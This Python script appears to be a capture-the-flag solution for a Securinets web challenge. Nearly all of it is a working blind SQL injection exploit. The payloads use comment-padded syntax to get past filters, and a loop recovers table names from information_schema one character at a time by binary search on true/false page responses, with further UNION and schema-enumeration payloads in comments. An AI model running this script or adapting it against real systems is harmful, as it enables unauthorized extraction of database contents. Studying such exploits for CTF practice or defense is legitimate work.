import requests

# defining the challenge sqli vulnerable endpoint
chal_endpoint = "http://web5.q20.ctfsecurinets.com/"
# http://web5.q20.ctfsecurinets.com/?search=%27%29%2F**%2Funion%2F**%2Fselect%2F**%2F*%2F**%2FFROM%2F**%2Finformation_schema.COLLATION_CHARACTER_SET_APPLICABILITY%3B%23%2C

# "1')/**/AND/**/(ascii(substr((SELECT/**/schema_name/**/FROM/**/information_schema.schemata/**/LIMIT/**/1/**/OFFSET/**/0)/**/FROM/**/1/**/FOR/**/1)))/**/>/**/95;#"

# Setting row_num here effectively decides which table name we would be extracting. Count starts at 0. Here we are getting the second table name "secrets"
row_num = 1
max_ascii = 127
min_ascii = 0
ascii_guess = 95
ascii_threshold = 2
guesses = []
guess_string = ""
# We need to also specify the database the table is in.
database_name_target = 'db'

guess_pos = 0
# How I'll be able to tell what my boolean evaluated to
response_body = "LOL Worlds 2019"
# Get the length of this name, just keep incrementing until the response body stops showing up
sqli_bool_true = True
while sqli_bool_true:
	guess_pos += 1
	print("Guessing %s" % guess_pos)
	# sqli = "1')/**/AND/**/(ascii(substr((SELECT/**/TABLE_NAME/**/FROM/**/information_schema.TABLES/**/WHERE/**/table_schema='db'/**/LIMIT/**/1/**/OFFSET/**/0)/**/FROM/**/1/**/FOR/**/1)))/**/>/**/95;#"
	sqli = "1')/**/AND/**/(ascii(substr((SELECT/**/TABLE_NAME/**/FROM/**/information_schema.TABLES/**/WHERE/**/table_schema='{}'/**/LIMIT/**/1/**/OFFSET/**/{})/**/FROM/**/{}/**/FOR/**/1)))/**/>/**/0;#".format(database_name_target, row_num, guess_pos)
	# params to be sent with GET request
	params = {'search':sqli} 
	

	# sending post request and saving response as response object 
	r = requests.get(url = chal_endpoint, params = params) 
	# extracting response text 
	sqli_bool_true = response_body in r.text

print("Length of table name is: %s" % (guess_pos - 1))
length_of_name = guess_pos


# stop when asci_threshold == 0 and we have sqli_bool_true set to true.
for guess_pos in range(1,length_of_name):
	max_ascii = 127
	min_ascii = 0
	ascii_guess = 95
	ascii_threshold = 2
	sqli_bool_true = True
	while ascii_threshold != 0 or not sqli_bool_true:
		print("Guessing %s" % ascii_guess)
		sqli = "1')/**/AND/**/(ascii(substr((SELECT/**/TABLE_NAME/**/FROM/**/information_schema.TABLES/**/WHERE/**/table_schema='{}'/**/LIMIT/**/1/**/OFFSET/**/{})/**/FROM/**/{}/**/FOR/**/1)))/**/>/**/{};#".format(database_name_target, row_num, guess_pos, ascii_guess)
		# params to be sent with GET request
		params = {'search':sqli} 
		

		# sending post request and saving response as response object 
		r = requests.get(url = chal_endpoint, params = params) 
		# extracting response text 
		sqli_bool_true = response_body in r.text
		if sqli_bool_true:
			if ascii_threshold == 0:
				min_ascii = ascii_guess
				ascii_threshold = 1
				ascii_guess += ascii_threshold
			else:
				# This means the ascii value was greater than our guess
				min_ascii = ascii_guess
				ascii_threshold = (max_ascii - ascii_guess) // 2
				ascii_guess += ascii_threshold
		else:
			# This means the ascii value is less than our guess
			if ascii_threshold == 0:
				max_ascii = ascii_guess
				ascii_threshold = 1
				ascii_guess -= ascii_threshold
			else:
				max_ascii = ascii_guess
				ascii_threshold = (ascii_guess - min_ascii) // 2
				ascii_guess -= ascii_threshold
	guesses.append(ascii_guess+1)
	guess_string += chr(ascii_guess + 1)
	print("The ascii char is: %s"%chr(ascii_guess+1)) 

print(guesses)
print(guess_string)
